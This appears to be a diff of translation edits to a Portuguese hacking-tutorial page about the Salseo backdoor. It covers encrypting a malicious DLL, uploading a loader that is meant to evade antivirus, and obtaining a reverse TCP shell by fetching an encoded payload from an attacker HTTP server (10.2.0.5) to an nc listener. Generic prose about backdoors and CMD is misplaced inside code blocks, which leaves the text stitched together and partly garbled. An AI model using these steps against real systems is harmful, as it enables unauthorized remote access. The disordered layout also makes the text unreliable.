@@ -39,7 +39,7 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 # Backdoors em Windows
 
-Um backdoor é uma forma de acesso não autorizado a um sistema ou rede, que permite ao invasor contornar as medidas de segurança e obter controle remoto sobre o sistema comprometido. Existem várias técnicas para criar backdoors em sistemas Windows, algumas das quais são descritas abaixo.
+Um backdoor é uma forma de acesso não autorizado a um sistema ou rede, que permite ao invasor contornar as medidas de segurança e obter controle remoto sobre o sistema comprometido. Existem várias técnicas para criar backdoors em sistemas Windows, algumas das quais são discutidas abaixo.
 
 ## 1. Porta dos fundos do Registro do Windows
 
@@ -64,13 +64,9 @@ Os drivers são programas que permitem que o sistema operacional Windows se comu
 
 Uma técnica menos comum é modificar um aplicativo legítimo para incluir um backdoor. Isso pode ser feito modificando o código do aplicativo ou injetando código malicioso em tempo de execução. Quando o aplicativo é executado, o backdoor é ativado e permite ao invasor obter acesso não autorizado ao sistema.
 
-## 6. Backdoors baseados em exploits
-
-Os exploits são vulnerabilidades de segurança em sistemas operacionais ou aplicativos que podem ser exploradas para obter acesso não autorizado. Um backdoor pode ser criado aproveitando um exploit conhecido e explorando-o para obter acesso ao sistema. Isso geralmente requer conhecimento avançado de programação e segurança.
-
 ## Conclusão
 
-Essas são apenas algumas das técnicas comuns usadas para criar backdoors em sistemas Windows. É importante estar ciente dessas técnicas para poder proteger seu sistema contra ataques e garantir a segurança de seus dados.
+Essas são apenas algumas das técnicas comuns usadas para criar backdoors em sistemas Windows. É importante estar ciente dessas técnicas para poder proteger seu sistema contra ataques de hackers.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -79,9 +75,9 @@ Ok, agora você tem tudo o que precisa para executar todo o processo de Salseo: 
 
 **Faça o upload do binário SalseoLoader.exe para a máquina. Eles não devem ser detectados por nenhum AV...**
 
-## **Executando a porta dos fundos**
+## **Executando a backdoor**
 
-### **Obtendo um shell reverso TCP (baixando a dll codificada por HTTP)**
+### **Obtendo um shell reverso TCP (baixando o dll codificado por HTTP)**
 
 Lembre-se de iniciar um nc como ouvinte de shell reverso e um servidor HTTP para servir o evilsalsa codificado.
 ```
@@ -126,7 +122,7 @@ Abra o projeto SalseoLoader usando o Visual Studio.
 
 ### Adicione antes da função principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Instale o DllExport para este projeto
 
@@ -158,7 +154,7 @@ Selecione **x64** (se você for usá-lo em uma máquina x64, esse foi o meu caso
 
 ### **Abra o projeto novamente com o Visual Studio**
 
-**\[DllExport]** não deve mais ser marcado como erro
+**\[DllExport]** não deve mais estar marcado como erro
 
 ![](<../.gitbook/assets/image (8) (1).png>)
 
@@ -207,7 +203,7 @@ Os hackers podem aproveitar o CMD para executar várias atividades maliciosas, c
 
 Para evitar o uso indevido do CMD, é recomendável implementar medidas de segurança, como restringir o acesso ao CMD, monitorar atividades suspeitas e manter o sistema operacional e os aplicativos atualizados com as últimas correções de segurança.
 
-No entanto, é importante ressaltar que o CMD também é uma ferramenta legítima e útil para administradores de sistemas e usuários avançados. Portanto, seu uso deve ser feito com responsabilidade e dentro dos limites legais e éticos.
+Em resumo, o CMD é uma ferramenta poderosa que pode ser usada tanto para fins legítimos quanto maliciosos. É essencial entender seu funcionamento e tomar precauções adequadas para garantir a segurança do sistema.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
